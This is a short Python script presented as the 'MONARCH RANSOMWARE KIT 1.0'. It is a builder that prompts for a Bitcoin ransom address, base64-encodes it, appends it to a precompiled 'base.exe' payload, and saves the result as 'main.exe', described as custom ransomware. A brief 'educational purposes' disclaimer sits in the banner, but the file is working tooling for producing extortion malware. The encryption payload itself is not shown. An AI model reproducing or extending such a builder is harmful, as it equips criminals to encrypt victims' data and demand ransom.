import os
import base64
import time
from colorama import init, Fore, Back, Style


def clear():
    #deletes old files from last use
    if os.path.exists("main.exe"):
        os.remove("main.exe")
    else:
        pass

def ui():
    #user interface
    os.system("clear")
    print(Fore.BLUE + """

                                                            
                                                            
     @@@@@@@@@                                 (@@@@@@@@*   
      @@@@@@@@@@@@                         %@@@@@@@@@@@*    
       &@@@@@@@@@@@@@     @       @     @@@@@@@@@@@@@@      
        &@@@     @  @@@&         *    @@*  @     @@@@       
         @@@       &%  @@@  @   &  &@@  @/       @@@,       
         @@,          @@  @@  @  @@  @@          @@@        
          *@@@@@@@        .@@@@@,@         #@@@@@@@         
                &@@@%     @@@@@@@@@     @@@@&               
             @@  #@@.     @ @@@@@ @    *@@@  /@@.           
           *@@  #@ ,   @  @ @@@@@ (  #   @%@   @@&          
           #@   @%,%     & @  @* / @  @  @#@.  %@@          
            &@%         , @   @,    @  *  .   @@@           
              &@@# /#    #           @  @  @@@@.            
                 ,@@@@@@@           @@@@@@@(                
                                                            
                MONARCH RANSOMWARE KIT 1.0
""")
    print(Fore.RED+"""
      WARNING: this tool is for educational purposes,
    always make sure to have the permission of the owner
        of a target device before using ransomware

""")
    print(Fore.WHITE + """

please type your btc ransom address and press enter""")    

def main():
    clear()
    ui()
    open("main.exe","wb").write(open("base.exe",'rb').read()) # writes precompiled base file to current working directory
    dat = open("main.exe","ab") #creates file handle for data to be appended to the base file
    dat.write(b"|||"+base64.b64encode(input(":").encode("utf-8"))) #appends encoded btc address to end of base file
    dat.close() # closes base file
    time.sleep(3) 
    while True:
        #end message and proper termination
        inp = input(Fore.GREEN+"\nthe custom ransomware was saved as \"main.exe\"\ndo not rename this file or it will not work\nPress Enter to quit\n"+Fore.WHITE)
        if len(inp) >= 0:
            break

main()
